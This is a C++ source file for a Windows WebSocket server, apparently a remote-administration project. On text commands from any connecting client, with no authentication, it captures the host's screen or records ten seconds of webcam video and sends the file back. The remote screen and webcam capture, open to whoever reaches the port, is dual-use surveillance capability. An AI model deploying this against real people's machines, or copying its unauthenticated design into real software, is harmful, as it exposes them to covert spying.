#include "websocket_server.h"
#include "screenshot.h"
#include "camera_recorder.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <bcrypt.h> // Cần cho SHA-1
#include <cstdio>   // Cần cho remove()

// +++ HÀM BASE64 TỰ VIẾT MỚI (SỬA LỖI HANDSHAKE) +++
static std::string base64_encode_manual(const BYTE* data, size_t len) {
    static const std::string base64_chars = 
                 "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                 "abcdefghijklmnopqrstuvwxyz"
                 "0123456789+/";
    std::string ret;
    int i = 0, j = 0;
    unsigned char char_array_3[3], char_array_4[4];
    while (len--) {
        char_array_3[i++] = *(data++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for(i = 0; (i <4) ; i++) ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        for(j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        for (j = 0; (j < i + 1); j++) ret += base64_chars[char_array_4[j]];
        while((i++ < 3)) ret += '=';
    }
    return ret;
}
// +++ KẾT THÚC HÀM MỚI +++


WebSocketServer::WebSocketServer(const std::string& ip, int port)
    : server_ip(ip), server_port(port), server_socket(INVALID_SOCKET) {}

WebSocketServer::~WebSocketServer() {
    if (server_socket != INVALID_SOCKET) closesocket(server_socket);
    WSACleanup();
    std::cout << "Server da tat." << std::endl;
}

void WebSocketServer::start() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Loi: WSAStartup that bai. Error: " << WSAGetLastError() << std::endl; return;
    }
    server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_socket == INVALID_SOCKET) {
        std::cerr << "Loi: Khong the tao socket. Error: " << WSAGetLastError() << std::endl; WSACleanup(); return;
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    inet_pton(AF_INET, server_ip.c_str(), &serverAddr.sin_addr);
    serverAddr.sin_port = htons(server_port);

    if (bind(server_socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Loi: bind() that bai. Error: " << WSAGetLastError() << std::endl;
        closesocket(server_socket); WSACleanup(); return;
    }
    if (listen(server_socket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Loi: listen() that bai. Error: " << WSAGetLastError() << std::endl;
        closesocket(server_socket); WSACleanup(); return;
    }

    std::cout << "✅ Server da san sang. Dang lang nghe ket noi..." << std::endl; 

    while (true) {
        sockaddr_in clientAddr{};
        int clientLen = sizeof(clientAddr);
        SOCKET clientSocket = accept(server_socket, (sockaddr*)&clientAddr, &clientLen);

        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Loi: accept() that bai. Error: " << WSAGetLastError() << std::endl;
            continue; 
        }
        
        std::cout << "Nhan duoc ket noi moi, dang xu ly handshake..." << std::endl;
        std::thread(&WebSocketServer::handle_client, this, clientSocket).detach();
    }
}

void WebSocketServer::handle_client(SOCKET client_socket) {
    if (!perform_handshake(client_socket)) {
        std::cerr << "-> Handshake that bai hoac Client ngat ket noi som." << std::endl;
        closesocket(client_socket);
        return;
    }
    std::cout << "-> Client da ket noi (Handshake OK)." << std::endl;
    
    std::vector<char> frame_buffer;
    std::string payload_data;       
    
    while (true) {
        frame_buffer.clear();
        payload_data.clear();
        
        if (!receive_frame(client_socket, frame_buffer)) {
            break; 
        }
        
        WebSocketFrameType frame_type = decode_websocket_frame(frame_buffer, payload_data);
        
        switch (frame_type) {
            case WebSocketFrameType::TEXT_FRAME:
                process_command(client_socket, payload_data);
                break;
            case WebSocketFrameType::CONTROL_FRAME:
                continue; 
            case WebSocketFrameType::BINARY_FRAME:
            case WebSocketFrameType::ERROR_FRAME:
            case WebSocketFrameType::INCOMPLETE:
            default:
                std::cerr << "-> Nhan duoc frame loi / khong ho tro. Dong ket noi." << std::endl;
                goto close_connection;
        }
    }

close_connection:
    std::cout << "-> Client da ngat ket noi." << std::endl;
    closesocket(client_socket);
}

void WebSocketServer::process_command(SOCKET client_socket, const std::string& cmd) {
    //--- KHỐI CODE ĐỂ XỬ LÝ ScreenShot ---
    if (cmd.find("SCREENSHOT") != std::string::npos) {
        std::cout << "-> Nhan lenh: SCREENSHOT" << std::endl;
        std::string image_path = "screenshot.jpg";
        
        std::cout << "   ...Dang chup man hinh..." << std::endl;
        capture_screen(image_path); 
        
        std::ifstream file(image_path, std::ios::binary | std::ios::ate);
        if (!file.is_open()) {
            std::cerr << "   ...LOI: Khong the mo file screenshot.jpg de doc." << std::endl;
            return;
        }

        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);
        std::cout << "   ...Dang doc file anh (" << std::to_string(size) << " bytes)." << std::endl;

        std::string image_data(size, '\0'); 
        if (file.read(&image_data[0], size)) {
            file.close(); 
            std::cout << "   ...Dang gui file anh..." << std::endl;
            if (send_data(client_socket, image_data, true)) { 
                 std::cout << "   ...Gui anh thanh cong." << std::endl;
            } else {
                 std::cerr << "   ...LOI: Gui anh that bai. Error: " << WSAGetLastError() << std::endl;
            }
        } else {
             std::cerr << "   ...LOI: Khong doc duoc toan bo file screenshot.jpg" << std::endl;
             file.close(); 
        }

        if (remove(image_path.c_str()) == 0) {
            std::cout << "   ...Da xoa file " << image_path << "." << std::endl;
        } else {
            std::cerr << "   ...LOI: Khong the xoa file " << image_path << "." << std::endl;
        }
    }
    // --- KHỐI CODE ĐỂ XỬ LÝ WEBCAM ---
    else if (cmd.find("WEBCAM_RECORD_10S") != std::string::npos) {
        std::cout << "-> Nhan lenh: WEBCAM_RECORD_10S" << std::endl;
        std::string video_path = "temp_video.webm";

        // 1. Gọi hàm ghi webcam (đã được tạo ở file mới)
        bool success = record_webcam(video_path, 10); // Ghi trong 10 giây

        if (!success) {
            std::cerr << "   ...LOI: Ghi webcam that bai." << std::endl;
            // (Chúng ta có thể gửi tin nhắn lỗi về client nếu muốn)
            return;
        }

        // 2. Đọc file video (Sử dụng lại logic y hệt như đọc file ảnh)
        std::ifstream file(video_path, std::ios::binary | std::ios::ate);
        if (!file.is_open()) {
            std::cerr << "   ...LOI: Khong the mo file temp_video.mp4 de doc." << std::endl;
            return;
        }

        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);
        std::cout << "   ...Dang doc file video (" << std::to_string(size) << " bytes)." << std::endl;

        std::string video_data(size, '\0'); 
        if (file.read(&video_data[0], size)) {
            file.close(); 
            std::cout << "   ...Dang gui file video..." << std::endl;
            // 3. Gửi file video
            if (send_data(client_socket, video_data, true)) { // Gửi dưới dạng binary
                 std::cout << "   ...Gui video thanh cong." << std::endl;
            } else {
                 std::cerr << "   ...LOI: Gui video that bai. Error: " << WSAGetLastError() << std::endl;
            }
        } else {
             std::cerr << "   ...LOI: Khong doc duoc toan bo file video." << std::endl;
             file.close(); 
        }

        // 4. Xóa file video
        if (remove(video_path.c_str()) == 0) {
            std::cout << "   ...Da xoa file " << video_path << "." << std::endl;
        } else {
            std::cerr << "   ...LOI: Khong the xoa file " << video_path << "." << std::endl;
        }
    }
    // --- KẾT THÚC ---

    else {
        std::cout << "-> Nhan lenh khong xac dinh: '" << cmd << "'" << std::endl;
    }
}

bool WebSocketServer::receive_frame(SOCKET client_socket, std::vector<char>& out_frame) {
    char buffer[4096];
    int bytes = recv(client_socket, buffer, sizeof(buffer), 0);
    
    if (bytes == 0) {
        std::cerr << "   [CHANDOAN] recv() tra ve 0. Client da chu dong dong ket noi (FIN)." << std::endl;
        return false; 
    } else if (bytes == SOCKET_ERROR) {
        int error = WSAGetLastError();
        std::cerr << "   [CHANDOAN] recv() bi loi SOCKET_ERROR. Ma loi: " << error << std::endl;
        if (error == 10054) std::cerr << "      -> (WSAECONNRESET): Ket noi bi cuong che dong boi Client hoac Firewall." << std::endl;
        if (error == 10053) std::cerr << "      -> (WSAECONNABORTED): Phan mem trong may host da huy bo ket noi." << std::endl;
        return false;
    }
    
    out_frame.assign(buffer, buffer + bytes);
    return true;
}

bool WebSocketServer::perform_handshake(SOCKET client_socket) {
    char buffer[4096];
    int bytes = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    if (bytes <= 0) return false;
    buffer[bytes] = '\0';
    
    std::string request(buffer, bytes);
    std::istringstream request_stream(request);
    std::string line;
    std::map<std::string, std::string> headers;

    std::getline(request_stream, line); 
    while (std::getline(request_stream, line) && line != "\r") {
        size_t colon_pos = line.find(':');
        if (colon_pos != std::string::npos) {
            std::string key = line.substr(0, colon_pos);
            std::string value = line.substr(colon_pos + 2);
            if (!value.empty() && value.back() == '\r') value.pop_back();
            headers[key] = value;
        }
    }

    if (headers.find("Upgrade") == headers.end() || headers["Upgrade"] != "websocket" ||
        headers.find("Sec-WebSocket-Key") == headers.end()) return false;

    std::string accept_key = calculate_accept_key(headers["Sec-WebSocket-Key"]);
    std::string response = "HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: " + accept_key + "\r\n\r\n";

    if (send(client_socket, response.c_str(), response.length(), 0) == SOCKET_ERROR) return false;
    return true;
}

WebSocketFrameType WebSocketServer::decode_websocket_frame(const std::vector<char>& frame, std::string& out_payload) {
    if (frame.size() < 2) return WebSocketFrameType::INCOMPLETE;
    unsigned char opcode = frame[0] & 0x0F;
    bool is_fin = (frame[0] & 0x80) != 0;
    if (!is_fin) return WebSocketFrameType::ERROR_FRAME; 
    bool is_masked = (frame[1] & 0x80) != 0;
    if (!is_masked) return WebSocketFrameType::ERROR_FRAME; 

    size_t payload_len = frame[1] & 0x7F;
    size_t mask_start = 2;
    if (payload_len == 126) {
        if (frame.size() < 4) return WebSocketFrameType::INCOMPLETE;
        payload_len = ((unsigned char)frame[2] << 8) | (unsigned char)frame[3];
        mask_start = 4;
    } else if (payload_len == 127) return WebSocketFrameType::ERROR_FRAME; 

    if (frame.size() < mask_start + 4 + payload_len) return WebSocketFrameType::INCOMPLETE;

    unsigned char mask[4];
    for (int i = 0; i < 4; ++i) mask[i] = frame[mask_start + i];
    size_t data_start = mask_start + 4;
    out_payload.clear();
    out_payload.reserve(payload_len);
    for (size_t i = 0; i < payload_len; ++i) out_payload += frame[data_start + i] ^ mask[i % 4];

    switch (opcode) {
        case 0x1: return WebSocketFrameType::TEXT_FRAME;
        case 0x2: return WebSocketFrameType::BINARY_FRAME;
        case 0x8: case 0x9: case 0xA: return WebSocketFrameType::CONTROL_FRAME; 
        default: return WebSocketFrameType::ERROR_FRAME;
    }
}

bool WebSocketServer::send_data(SOCKET client_socket, const std::string& data, bool isBinary) {
    size_t data_len = data.size();
    std::vector<unsigned char> frame_header(10);
    size_t header_size = 2;
    frame_header[0] = isBinary ? 0x82 : 0x81; 
    if (data_len <= 125) {
        frame_header[1] = data_len;
    } else if (data_len <= 65535) {
        frame_header[1] = 126;
        frame_header[2] = (data_len >> 8) & 0xFF;
        frame_header[3] = data_len & 0xFF;
        header_size = 4;
    } else {
        frame_header[1] = 127;
        frame_header[6] = (data_len >> 24) & 0xFF;
        frame_header[7] = (data_len >> 16) & 0xFF;
        frame_header[8] = (data_len >> 8) & 0xFF;
        frame_header[9] = data_len & 0xFF;
        header_size = 10;
    }
    if (send(client_socket, (char*)frame_header.data(), header_size, 0) == SOCKET_ERROR) return false;
    size_t total_sent = 0;
    while (total_sent < data_len) {
        int bytes_sent = send(client_socket, data.c_str() + total_sent, data_len - total_sent, 0);
        if (bytes_sent == SOCKET_ERROR) return false;
        total_sent += bytes_sent;
    }
    return true;
}

std::string WebSocketServer::calculate_accept_key(const std::string& client_key) {
    const std::string magic_string = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    std::string combined = client_key + magic_string;
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_HASH_HANDLE hHash = NULL; std::vector<BYTE> hash(20); 
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA1_ALGORITHM, NULL, 0);
    BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    BCryptHashData(hHash, (PBYTE)combined.c_str(), (ULONG)combined.length(), 0);
    BCryptFinishHash(hHash, hash.data(), (ULONG)hash.size(), 0);
    BCryptDestroyHash(hHash); BCryptCloseAlgorithmProvider(hAlg, 0);
    
    // Gọi hàm base64 mới, an toàn (Đã sửa lỗi Handshake)
    return base64_encode_manual(hash.data(), hash.size());
}